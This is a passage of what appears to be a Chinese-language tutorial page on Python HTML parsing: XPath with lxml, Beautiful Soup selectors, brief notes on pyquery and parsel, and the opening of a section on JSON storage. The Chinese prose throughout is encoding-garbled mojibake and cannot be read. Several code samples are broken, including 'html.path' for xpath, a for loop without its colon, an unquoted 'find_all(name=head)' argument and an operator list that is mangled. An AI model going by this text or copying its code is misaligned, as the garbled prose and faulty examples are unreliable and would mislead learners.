é€‰å–æ‰€æœ‰å…·æœ‰æŒ‡å®šå…ƒç´ å¹¶ä¸”æ–‡æœ¬å†…å®¹æ˜¯ text çš„èŠ‚ç‚¹<br>å¦‚:<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">//</span>title[@lang=<span class="hljs-string">&#x27;eng&#x27;</span>]<br></code></pre></td></tr></table></figure>æ¯ä¸€ä¸ªè§„åˆ™åé¢è·Ÿçš„åº”è¯¥å°±æ˜¯å˜é‡åï¼Œè¿™é‡Œä»£è¡¨æ‰€æœ‰åç§°ä¸º titleï¼ŒåŒæ—¶å±æ€§ lang çš„å€¼ä¸º eng çš„èŠ‚ç‚¹.</li></ul><h3 id="å®‰è£…"><a href="#å®‰è£…" class="headerlink" title="å®‰è£…"></a>å®‰è£…</h3><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmake">pip <span class="hljs-keyword">install</span> lxml<br></code></pre></td></tr></table></figure><h3 id="ä½¿ç”¨"><a href="#ä½¿ç”¨" class="headerlink" title="ä½¿ç”¨"></a>ä½¿ç”¨</h3><p>Python ä¸­ä¸‰ä¸ªå¼•å·å…è®¸å­—ç¬¦ä¸²è·¨å¤šè¡Œä½¿ç”¨ï¼ŒåŒ…æ‹¬æ¢è¡Œï¼Œtabç­‰ç‰¹æ®Šå­—ç¬¦ã€‚å¼•å·å¯ä»¥ä¸ºå•å¼•å·ä¹Ÿå¯ä¸ºåŒå¼•å·.</p><p>lxml åº“ä¸­çš„ etree æ¨¡å—å¯ä»¥è‡ªåŠ¨ä¿®æ­£ HTML æ–‡æœ¬.</p><p>æ„é€ è§£æå¯¹è±¡:</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-selector-tag">html</span> = etree<span class="hljs-selector-class">.HTML</span>(text)<br>result = etree<span class="hljs-selector-class">.tostring</span>(html)<br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(result.decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)</span></span>)<br></code></pre></td></tr></table></figure><p><code>text</code> æ˜¯ä¸€æ®µ HTML ä»£ç å­—ç¬¦ä¸²ï¼Œè¿™é‡Œ <code>HTML</code> æ˜¯ä¸€ä¸ªç±»ï¼Œç”¨äºåˆå§‹åŒ–è¿™ä¸ªæ–‡æœ¬ã€‚</p><p><code>tostring</code> æ–¹æ³•è¾“å‡ºä¿®æ­£åçš„ HTML æ–‡æœ¬ã€‚ä½†å…¶ä¸º bytes ç±»å‹ã€‚</p><p>ä¹Ÿå¯ç›´æ¥è§£ææ–‡æœ¬æ–‡ä»¶:</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs stylus">from lxml import etree <br><br><span class="hljs-selector-tag">html</span> = etree<span class="hljs-selector-class">.parse</span>(<span class="hljs-string">&#x27;./test.html&#x27;</span>, etree<span class="hljs-selector-class">.HTMLParser</span>())<br>result = etree<span class="hljs-selector-class">.tostring</span>(html)<br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(result.decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)</span></span>)<br></code></pre></td></tr></table></figure><p>è¿™é‡Œçš„ <code>parse</code> æ–¹æ³•çš„ç¬¬ä¸€ä¸ªå‚æ•°ä¸º HTML æ–‡ä»¶çš„è·¯å¾„.</p><h3 id="æ‰€æœ‰èŠ‚ç‚¹"><a href="#æ‰€æœ‰èŠ‚ç‚¹" class="headerlink" title="æ‰€æœ‰èŠ‚ç‚¹"></a>æ‰€æœ‰èŠ‚ç‚¹</h3><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs stylus">from lxml import etree<br><br><span class="hljs-selector-tag">html</span> = etree<span class="hljs-selector-class">.parse</span>(<span class="hljs-string">&#x27;./test.html&#x27;</span>, etree<span class="hljs-selector-class">.HTMLParser</span>())<br>result = <span class="hljs-selector-tag">html</span><span class="hljs-selector-class">.xpath</span>(<span class="hljs-string">&#x27;//*&#x27;</span>)<br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(result)</span></span><br></code></pre></td></tr></table></figure><p>è¿™é‡Œ <code>xpath</code> æ–¹æ³•çš„å‚æ•°å°±æ˜¯ XPath è¡¨è¾¾å¼ï¼Œå…¶ä¸­ <code>*</code> åŒ¹é…æ‰€æœ‰èŠ‚ç‚¹ã€‚</p><p>ç»“æœè¿”å›ä¸€ä¸ªåˆ—è¡¨ã€‚å…¶ä¸­æ¯ä¸ªå…ƒç´ éƒ½æ˜¯ Element ç±»å‹ã€‚</p><h3 id="å­èŠ‚ç‚¹"><a href="#å­èŠ‚ç‚¹" class="headerlink" title="å­èŠ‚ç‚¹"></a>å­èŠ‚ç‚¹</h3><p>é€‰æ‹©å½“å‰ li èŠ‚ç‚¹çš„æ‰€æœ‰ç›´æ¥å­èŠ‚ç‚¹ a:</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">result</span> = html.path(<span class="hljs-string">&#x27;//li/a&#x27;</span>)<br></code></pre></td></tr></table></figure><h3 id="çˆ¶èŠ‚ç‚¹"><a href="#çˆ¶èŠ‚ç‚¹" class="headerlink" title="çˆ¶èŠ‚ç‚¹"></a>çˆ¶èŠ‚ç‚¹</h3><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">result</span> = html.xpath(<span class="hljs-string">&#x27;//a[<span class="hljs-variable">@href</span>=&quot;link4.html&quot;]/../<span class="hljs-variable">@class</span>&#x27;</span>)<br></code></pre></td></tr></table></figure><p><code>//a[@href=&quot;link4.html&quot;]</code> çš„å«ä¹‰æ˜¯ï¼ŒèŠ‚ç‚¹ä¸º <code>a</code>, å…¶å±æ€§ <code>href</code> çš„å€¼ä¸º <code>link4.html</code>.</p><h3 id="å±æ€§åŒ¹é…"><a href="#å±æ€§åŒ¹é…" class="headerlink" title="å±æ€§åŒ¹é…"></a>å±æ€§åŒ¹é…</h3><h3 id="æ–‡æœ¬è·å–"><a href="#æ–‡æœ¬è·å–" class="headerlink" title="æ–‡æœ¬è·å–"></a>æ–‡æœ¬è·å–</h3><p>ç”¨ XPath ä¸­çš„ <code>text</code> æ–¹æ³•å¯ä»¥å¾—åˆ°èŠ‚ç‚¹ä¸­çš„æ–‡æœ¬:</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">result</span> = html.xpath(<span class="hljs-string">&#x27;//li[@class=&quot;item-0&quot;]/text()&#x27;</span>)<br></code></pre></td></tr></table></figure><h3 id="å±æ€§è·å–"><a href="#å±æ€§è·å–" class="headerlink" title="å±æ€§è·å–"></a>å±æ€§è·å–</h3><p>ä½¿ç”¨ <code>@</code> ç¬¦å·:</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">result</span> = html.xpath(<span class="hljs-string">&#x27;//li/a/@href&#x27;</span>)<br></code></pre></td></tr></table></figure><p>ç›´æ¥çš„ <code>@href</code> æ˜¯è·å– href å±æ€§çš„å€¼ï¼Œ<code>[@href=&quot;link4.html&quot;]</code> æ˜¯é™å®šæŸä¸ªå±æ€§.</p><h3 id="å±æ€§å¤šå€¼åŒ¹é…"><a href="#å±æ€§å¤šå€¼åŒ¹é…" class="headerlink" title="å±æ€§å¤šå€¼åŒ¹é…"></a>å±æ€§å¤šå€¼åŒ¹é…</h3><p>ä¹Ÿå°±æ˜¯æŸä¸ªå±æ€§çš„å€¼æœ‰å¤šä¸ª, ä½†åªé™å®šä¸€ä¸ª, ä½¿ç”¨ <code>contain</code> æ–¹æ³•:</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">result</span> = html.xpath(<span class="hljs-string">&#x27;//li[contains(@class, &quot;li&quot;)]/a/text()&#x27;</span>)<br></code></pre></td></tr></table></figure><p>ç¬¬ä¸€ä¸ªå‚æ•°ä¸ºå±æ€§åï¼Œç¬¬äºŒä¸ªå‚æ•°ä¸ºå€¼.</p><h3 id="å¤šå±æ€§åŒ¹é…"><a href="#å¤šå±æ€§åŒ¹é…" class="headerlink" title="å¤šå±æ€§åŒ¹é…"></a>å¤šå±æ€§åŒ¹é…</h3><p>éœ€è¦æ ¹æ®å¤šä¸ªå±æ€§æ¥ç¡®å®šä¸€ä¸ªèŠ‚ç‚¹, ä½¿ç”¨ <code>and</code> è¿æ¥å¤šä¸ªå±æ€§:</p><figure class="highlight golo"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs golo">result = html.xpath(&#x27;//li[contains(<span class="hljs-meta">@class</span>, <span class="hljs-string">&quot;li&quot;</span>) and <span class="hljs-meta">@name</span>=<span class="hljs-string">&quot;item&quot;</span>]/a/text()&#x27;)<br></code></pre></td></tr></table></figure><h3 id="XPath-ä¸­çš„è¿ç®—ç¬¦"><a href="#XPath-ä¸­çš„è¿ç®—ç¬¦" class="headerlink" title="XPath ä¸­çš„è¿ç®—ç¬¦"></a>XPath ä¸­çš„è¿ç®—ç¬¦</h3><ul><li>or</li><li>and</li><li>mod</li><li>|</li><li><ul><li></li></ul></li><li><ul><li></li></ul></li><li><ul><li></li></ul></li><li>div</li><li>&#x3D;</li><li>!&#x3D;</li><li>&lt; </li><li>&lt;&#x3D;</li><li><blockquote></blockquote></li><li><blockquote><p>&#x3D;</p></blockquote></li></ul><h3 id="æŒ‰åºé€‰æ‹©"><a href="#æŒ‰åºé€‰æ‹©" class="headerlink" title="æŒ‰åºé€‰æ‹©"></a>æŒ‰åºé€‰æ‹©</h3><p>æœ‰å¤šä¸ªåŒ¹é…ï¼Œä½†åªé€‰å–ä¸€ä¸ª:</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">result</span> = html.xpath(<span class="hljs-string">&#x27;//li[1]/a/text()&#x27;</span>)  <span class="hljs-comment"># 1 å³é€‰æ‹©åŒ¹é…åˆ°çš„ç¬¬ä¸€ä¸ª </span><br><span class="hljs-attr">result</span> = html.xpath(<span class="hljs-string">&#x27;//li[last()]/a/text()&#x27;</span>)<br><span class="hljs-attr">result</span> = html.xpath(<span class="hljs-string">&#x27;//li[position()&lt;3]/a/text()&#x27;</span>)<br><span class="hljs-attr">result</span> = html.xpath(<span class="hljs-string">&#x27;//li[last()-2]/a/text()&#x27;</span>)<br></code></pre></td></tr></table></figure><p>è¿™æ—¶ <code>[]</code> å†…åº”è¯¥ä¸ºä½ç½®çš„ index.</p><h3 id="èŠ‚ç‚¹è½´é€‰æ‹©"><a href="#èŠ‚ç‚¹è½´é€‰æ‹©" class="headerlink" title="èŠ‚ç‚¹è½´é€‰æ‹©"></a>èŠ‚ç‚¹è½´é€‰æ‹©</h3><p>è½´çš„å½¢å¼ä¸º <code>name::</code> </p><p>å¦‚ç¥–å…ˆèŠ‚ç‚¹è½´: <code>ancestor::</code></p><h2 id="3-2-Beautiful-Soup-ä½¿ç”¨"><a href="#3-2-Beautiful-Soup-ä½¿ç”¨" class="headerlink" title="3.2 Beautiful Soup ä½¿ç”¨"></a>3.2 Beautiful Soup ä½¿ç”¨</h2><p>Beautiful Soup å€ŸåŠ©ç½‘é¡µ1çš„ç»“æ„å’Œå±æ€§ç­‰ç‰¹æ€§æ¥è§£æç½‘é¡µã€‚</p><h3 id="ç®€ä»‹"><a href="#ç®€ä»‹" class="headerlink" title="ç®€ä»‹"></a>ç®€ä»‹</h3><p>Beautiful Soup æ˜¯ Python çš„ä¸€ä¸ª HTML æˆ– XML çš„è§£æåº“ã€‚</p><p>Beautiful Soup ä¼šè‡ªåŠ¨å°†è¾“å…¥æ–‡æ¡£è½¬æ¢ä¸º Unicode ç¼–ç ï¼Œå°†è¾“å‡ºæ–‡æ¡£è½¬æ¢ä¸º utf-8 ç¼–ç ã€‚</p><h3 id="è§£æå™¨"><a href="#è§£æå™¨" class="headerlink" title="è§£æå™¨"></a>è§£æå™¨</h3><p>Beautiful Soup ä¸­çš„è§£æå™¨åŠä½¿ç”¨æ–¹æ³•:</p><ul><li>Python æ ‡å‡†åº“, <code>BeautifulSoup(markup, &#39;html.parser&#39;)</code></li><li>LXML HTML, <code>BeautifulSoup(markup, &#39;lxml&#39;)</code></li><li>LXML XML, <code>BeautifulSoup(markup, &#39;xml&#39;)</code></li><li>html5lib, <code>BeautifulSoup(markup, &#39;html5lib&#39;)</code></li></ul><p>LXML è§£æå™¨èƒ½è§£æ HTML å’Œ  XML.</p><p>ä¾‹å¦‚:</p><figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs moonscript"><span class="hljs-keyword">from</span> bs4 <span class="hljs-keyword">import</span> BeautifulSoup<br><br>soup = BeautifulSoup(<span class="hljs-string">&#x27;&lt;p&gt;Hello&lt;p&gt;&#x27;</span>, <span class="hljs-string">&#x27;lxml&#x27;</span>)<br><span class="hljs-built_in">print</span>(soup.p.<span class="hljs-built_in">string</span>)<br></code></pre></td></tr></table></figure><h3 id="åŸºæœ¬ç”¨æ³•"><a href="#åŸºæœ¬ç”¨æ³•" class="headerlink" title="åŸºæœ¬ç”¨æ³•"></a>åŸºæœ¬ç”¨æ³•</h3><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs stylus">from bs4 import BeautifulSoup<br><br>soup = <span class="hljs-built_in">BeautifulSoup</span>(<span class="hljs-selector-tag">html</span>, <span class="hljs-string">&#x27;lxml&#x27;</span>)<br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(soup.prettify()</span></span>)<br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(soup.title.string)</span></span><br></code></pre></td></tr></table></figure><p><code>BeautifulSoup</code> æ˜¯ä¸€ä¸ªå¯¹è±¡ï¼Œå…¶ç¬¬ä¸€ä¸ªå‚æ•°ä¸º HTML å­—ç¬¦ä¸²ï¼Œç¬¬äºŒä¸ªå‚æ•°ä¸ºè§£æå™¨çš„ç±»å‹ã€‚</p><p>ç”¨åˆ°çš„å‡ ä¸ªæ–¹æ³•:</p><h4 id="prettify"><a href="#prettify" class="headerlink" title="prettify()"></a>prettify()</h4><p>æŠŠè¦è§£æçš„å­—ç¬¦ä¸²ä»¥æ ‡å‡†çš„ç¼©è¿›æ ¼å¼è¾“å‡ºã€‚</p><p>ä¹Ÿå°±æ˜¯è®©æˆ‘ä»¬ä»¥ç¾è§‚çš„æ–¹å¼çœ‹åˆ°æœ€å¼€å§‹è¦å¤„ç†çš„å­—ç¬¦ä¸².</p><p>è‹¥ HTML å­—ç¬¦ä¸²ä¸æ ‡å‡†ï¼Œå¯ä»¥è‡ªåŠ¨æ›´æ­£ã€‚</p><h4 id="title"><a href="#title" class="headerlink" title="title"></a>title</h4><p><code>soup.title.string</code> å…¶ä¸­ title æ˜¯é€‰å‡º HTML ä¸­çš„ title èŠ‚ç‚¹ï¼Œè°ƒç”¨ <code>string</code> å±æ€§å°±å¾—åˆ°èŠ‚ç‚¹å†…çš„æ–‡æœ¬.</p><h3 id="èŠ‚ç‚¹é€‰æ‹©å™¨"><a href="#èŠ‚ç‚¹é€‰æ‹©å™¨" class="headerlink" title="èŠ‚ç‚¹é€‰æ‹©å™¨"></a>èŠ‚ç‚¹é€‰æ‹©å™¨</h3><p>å®é™…ä¸Šï¼Œç›´æ¥è°ƒç”¨èŠ‚ç‚¹çš„åç§°å°±èƒ½é€‰æ‹©èŠ‚ç‚¹ï¼Œå¦‚ head, p ç­‰ã€‚åœ¨è°ƒç”¨ <code>string</code> å±æ€§å°±å¯ä»¥å¾—åˆ°æ–‡æœ¬ã€‚ä¸ç”¨ <code>string</code> æ‰“å°çš„å°±æ˜¯ HTML ä»£ç ã€‚</p><p>å½¢å¼ä¸º:</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">bs4.element.<span class="hljs-keyword">tag</span><br></code></pre></td></tr></table></figure><p><code>Tag</code> å°±æ˜¯å±æ€§ã€‚</p><p>å½“æœ‰å¤šä¸ªèŠ‚ç‚¹æ—¶ï¼Œè¿™ç§æ–¹æ³•åªèƒ½é€‰å–ç¬¬ä¸€ä¸ªåŒ¹é…é¡¹ã€‚</p><h3 id="æå–ä¿¡æ¯"><a href="#æå–ä¿¡æ¯" class="headerlink" title="æå–ä¿¡æ¯"></a>æå–ä¿¡æ¯</h3><h4 id="è·å–èŠ‚ç‚¹åç§°"><a href="#è·å–èŠ‚ç‚¹åç§°" class="headerlink" title="è·å–èŠ‚ç‚¹åç§°"></a>è·å–èŠ‚ç‚¹åç§°</h4><p>ä½¿ç”¨ <code>name</code> å±æ€§ã€‚</p><h4 id="è·å–å±æ€§"><a href="#è·å–å±æ€§" class="headerlink" title="è·å–å±æ€§"></a>è·å–å±æ€§</h4><p>ä½¿ç”¨ <code>attrs</code> å±æ€§ï¼Œå…¶è¿”å›å­—å…¸:</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(soup.p.attrs)</span></span><br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(soup.p.attrs[<span class="hljs-string">&#x27;name&#x27;</span>])</span></span><br></code></pre></td></tr></table></figure><h4 id="è·å–å†…å®¹"><a href="#è·å–å†…å®¹" class="headerlink" title="è·å–å†…å®¹"></a>è·å–å†…å®¹</h4><p>ä½¿ç”¨ <code>string</code> å±æ€§ã€‚</p><h4 id="åµŒå¥—é€‰æ‹©"><a href="#åµŒå¥—é€‰æ‹©" class="headerlink" title="åµŒå¥—é€‰æ‹©"></a>åµŒå¥—é€‰æ‹©</h4><p>å¯¹ä»˜èŠ‚ç‚¹é‡Œé¢æœ‰èŠ‚ç‚¹:</p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs maxima"><span class="hljs-built_in">print</span>(soup.head.<span class="hljs-built_in">title</span>.<span class="hljs-built_in">string</span>)<br></code></pre></td></tr></table></figure><h3 id="å…³è”é€‰æ‹©"><a href="#å…³è”é€‰æ‹©" class="headerlink" title="å…³è”é€‰æ‹©"></a>å…³è”é€‰æ‹©</h3><p>å³ä»¥æŸä¸€ç‚¹ä¸ºå½“å‰èŠ‚ç‚¹ï¼Œç„¶åé€‰å–çˆ¶èŠ‚ç‚¹ä¹‹ç±»çš„ã€‚</p><h4 id="å­èŠ‚ç‚¹å’Œå­å­™èŠ‚ç‚¹"><a href="#å­èŠ‚ç‚¹å’Œå­å­™èŠ‚ç‚¹" class="headerlink" title="å­èŠ‚ç‚¹å’Œå­å­™èŠ‚ç‚¹"></a>å­èŠ‚ç‚¹å’Œå­å­™èŠ‚ç‚¹</h4><p>è°ƒç”¨ <code>contents</code> å±æ€§ï¼Œè·å–ç›´æ¥å­èŠ‚ç‚¹, å…¶å¾—åˆ°çš„ç»“æœæ˜¯ç›´æ¥å­èŠ‚ç‚¹ç»„æˆçš„åˆ—è¡¨ã€‚</p><p>è°ƒç”¨ <code>children</code> å±æ€§èƒ½å¾—åˆ°ç›¸åº”çš„ç»“æœã€‚å…¶è¿”å›ç»“æœæ˜¯ç”Ÿæˆå™¨ç±»å‹ã€‚</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs stylus">from bs4 import BeautifulSoup<br><br>soup = <span class="hljs-built_in">BeautifulSoup</span>(<span class="hljs-selector-tag">html</span>, <span class="hljs-string">&#x27;lxml&#x27;</span>)<br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(soup.p.children)</span></span><br><span class="hljs-keyword">for</span> <span class="hljs-selector-tag">i</span>, child <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(soup<span class="hljs-selector-class">.p</span>.children)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-selector-tag">i</span>, child)<br></code></pre></td></tr></table></figure><p>è¿™é‡Œ <code>enumerate()</code> å‡½æ•°æ˜¯ Python å†…ç½®å‡½æ•°ï¼Œå…¶å‚æ•°ä¸ºå¯è¿­ä»£å¯¹è±¡, å¯ç”¨äºè®¡æ•°ï¼Œè¿”å›å€¼æ˜¯ enumerate å¯¹è±¡ï¼Œå¯åŒæ—¶è·å–å‚æ•°çš„ç´¢å¼•å’Œå€¼ï¼Œæ¯”å¦‚è¿™é‡Œçš„ <code>i</code> å°±æ˜¯ç´¢å¼•ï¼Œ<code>child</code> å°±æ˜¯å€¼ã€‚</p><p>å¾—åˆ°å­å­™ç»“ç‚¹ï¼Œè°ƒç”¨ <code>descendants</code> å±æ€§ã€‚å…¶è¿”å›ç»“æœä¹Ÿæ˜¯ç”Ÿæˆå™¨ç±»å‹ã€‚</p><h4 id="çˆ¶èŠ‚ç‚¹å’Œç¥–å…ˆèŠ‚ç‚¹"><a href="#çˆ¶èŠ‚ç‚¹å’Œç¥–å…ˆèŠ‚ç‚¹" class="headerlink" title="çˆ¶èŠ‚ç‚¹å’Œç¥–å…ˆèŠ‚ç‚¹"></a>çˆ¶èŠ‚ç‚¹å’Œç¥–å…ˆèŠ‚ç‚¹</h4><p>è·å–çˆ¶èŠ‚ç‚¹ï¼Œç”¨ <code>parent</code> å±æ€§ã€‚</p><p>è·å–æ‰€æœ‰ç¥–å…ˆèŠ‚ç‚¹ï¼Œç”¨ <code>parents</code> å±æ€§ã€‚</p><h4 id="å…„å¼ŸèŠ‚ç‚¹"><a href="#å…„å¼ŸèŠ‚ç‚¹" class="headerlink" title="å…„å¼ŸèŠ‚ç‚¹"></a>å…„å¼ŸèŠ‚ç‚¹</h4><p>ä¸‹ä¸€ä¸ªå…„å¼ŸèŠ‚ç‚¹ç”¨ <code>next_siblings</code> å±æ€§ã€‚</p><p>ä¸Šä¸€ä¸ªç”¨ <code>previous_siblings</code> å±æ€§.</p><h4 id="æå–ä¿¡æ¯-1"><a href="#æå–ä¿¡æ¯-1" class="headerlink" title="æå–ä¿¡æ¯"></a>æå–ä¿¡æ¯</h4><p>åŒæ ·ç”¨ <code>string</code> ç­‰ã€‚</p><h3 id="æ–¹æ³•é€‰æ‹©å™¨"><a href="#æ–¹æ³•é€‰æ‹©å™¨" class="headerlink" title="æ–¹æ³•é€‰æ‹©å™¨"></a>æ–¹æ³•é€‰æ‹©å™¨</h3><p>æ–¹ä¾¿çµæ´»æŸ¥è¯¢.</p><h4 id="find-all"><a href="#find-all" class="headerlink" title="find_all"></a>find_all</h4><p>æŸ¥è¯¢æ‰€æœ‰ç¬¦åˆæ¡ä»¶çš„å…ƒç´ ï¼Œå¯ä»¥ç»™å®ƒä¼ å…¥ä¸€äº›å±æ€§æˆ–æ–‡æœ¬:</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">find<span class="hljs-constructor">_all(<span class="hljs-params">name</span>, <span class="hljs-params">attrs</span>, <span class="hljs-params">recursive</span>, <span class="hljs-params">text</span>, <span class="hljs-operator">**</span><span class="hljs-params">kwargs</span>)</span><br></code></pre></td></tr></table></figure><p>å…¶è¿”å›å€¼æ˜¯åˆ—è¡¨ã€‚</p><h5 id="name"><a href="#name" class="headerlink" title="name"></a>name</h5><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">find<span class="hljs-constructor">_all(<span class="hljs-params">name</span>=<span class="hljs-params">head</span>)</span><br></code></pre></td></tr></table></figure><h5 id="attrs"><a href="#attrs" class="headerlink" title="attrs"></a>attrs</h5><p>ä¼ å…¥çš„å‚æ•°ä¸ºå­—å…¸ç±»å‹:</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">find_all</span><span class="hljs-params">(attrs=&#123;<span class="hljs-string">&#x27;id&#x27;</span> : <span class="hljs-string">&#x27;list&#x27;</span>&#125;)</span></span><br></code></pre></td></tr></table></figure><h5 id="text"><a href="#text" class="headerlink" title="text"></a>text</h5><p>å¯ä»¥ä¼ å…¥å­—ç¬¦ä¸²ï¼Œä¹Ÿå¯ä»¥æ˜¯æ­£åˆ™è¡¨è¾¾å¼:</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">print(soup.find<span class="hljs-constructor">_all(<span class="hljs-params">text</span>=<span class="hljs-params">re</span>.<span class="hljs-params">compile</span>(&#x27;<span class="hljs-params">link</span>&#x27;)</span>))<br></code></pre></td></tr></table></figure><h4 id="find"><a href="#find" class="headerlink" title="find"></a>find</h4><p>è¿”å›å•ä¸ªå…ƒç´ .</p><h4 id="å…¶å®ƒ"><a href="#å…¶å®ƒ" class="headerlink" title="å…¶å®ƒ"></a>å…¶å®ƒ</h4><p>ä½¿ç”¨æ–¹æ³•å’Œ find_all ç›¸åŒ:</p><ul><li>find_parents</li><li>find_parent</li><li>find_next_siblings</li><li>find_previous_siblings</li><li>find_all_next</li><li>find_next</li><li>find_all_previous</li><li>find_previous</li></ul><h3 id="CSS-é€‰æ‹©å™¨"><a href="#CSS-é€‰æ‹©å™¨" class="headerlink" title="CSS é€‰æ‹©å™¨"></a>CSS é€‰æ‹©å™¨</h3><h2 id="3-3-pyquery-çš„ä½¿ç”¨"><a href="#3-3-pyquery-çš„ä½¿ç”¨" class="headerlink" title="3.3 pyquery çš„ä½¿ç”¨"></a>3.3 pyquery çš„ä½¿ç”¨</h2><p>é€‚åˆäºå–œæ¬¢ç”¨ CSS é€‰æ‹©å™¨ã€‚</p><h2 id="3-4-parsel-çš„ä½¿ç”¨"><a href="#3-4-parsel-çš„ä½¿ç”¨" class="headerlink" title="3.4 parsel çš„ä½¿ç”¨"></a>3.4 parsel çš„ä½¿ç”¨</h2><p>XPath å’Œ CSS é€‰æ‹©å™¨ä¸€èµ·ä½¿ç”¨ã€‚</p><h1 id="ç¬¬4ç« -æ•°æ®çš„å­˜å‚¨"><a href="#ç¬¬4ç« -æ•°æ®çš„å­˜å‚¨" class="headerlink" title="ç¬¬4ç«  æ•°æ®çš„å­˜å‚¨"></a>ç¬¬4ç«  æ•°æ®çš„å­˜å‚¨</h1><h2 id="4-2-JSON-æ–‡ä»¶å­˜å‚¨"><a href="#4-2-JSON-æ–‡ä»¶å­˜å‚¨" class="headerlink" title="4.2 JSON æ–‡ä»¶å­˜å‚¨"></a>4.2 JSON æ–‡ä»¶å­˜å‚¨</h2><p>JSON å…¨ç§°ä¸º JavaScript Object Notation, å³ JavaScript å¯¹è±¡æ ‡è®°ï¼Œé€šè¿‡å¯¹è±¡å’Œæ•°ç»„çš„ç»„åˆè¡¨ç¤ºæ•°æ®.</p><h3 id="å¯¹è±¡å’Œæ•°ç»„"><a href="#å¯¹è±¡å’Œæ•°ç»„" class="headerlink" title="å¯¹è±¡å’Œæ•°ç»„"></a>å¯¹è±¡å’Œæ•°ç»„</h3><p>å¯¹è±¡åœ¨ JavaScript ä¸­æ˜¯æŒ‡ç”¨èŠ±æ‹¬å· <code>&#123;&#125;</code> åŒ…å›´èµ·æ¥çš„å†…å®¹ï¼Œæ•°æ®ç»“æ„æ˜¯ <code>&#123;key1: value1, key2: value2 ...&#125;</code>. åœ¨é¢å‘å¯¹è±¡è¯­è¨€ä¸­ï¼Œ<code>key</code> è¡¨ç¤ºå¯¹è±¡çš„å±æ€§ã€<code>value</code> è¡¨ç¤ºå±æ€§å¯¹åº”çš„å€¼ã€‚</p><p>æ•°ç»„åœ¨ JavaScript ä¸­æ˜¯æŒ‡ç”¨æ–¹æ‹¬å· <code>[]</code> åŒ…å›´èµ·æ¥çš„å†…å®¹ï¼Œæ•°æ®ç»“æ„æ˜¯ <code>[&quot;java&quot;, &quot;javascript&quot;, ...]</code> è¿™ç§ç´¢å¼•ç»“æ„ã€‚</p><h3 id="è¯»å–-JSON"><a href="#è¯»å–-JSON" class="headerlink" title="è¯»å– JSON"></a>è¯»å– JSON</h3><p>ä½¿ç”¨ Python çš„ json åº“ã€‚</p><p><code>loads</code> æ–¹æ³•ï¼Œå°†æ–‡æœ¬å­—ç¬¦ä¸²è½¬åŒ–ä¸º JSON å¯¹è±¡(å³ Python ä¸­çš„åˆ—è¡¨å’Œå­—å…¸çš„åµŒå¥—ç»„åˆ).</p><p><code>dumps</code> 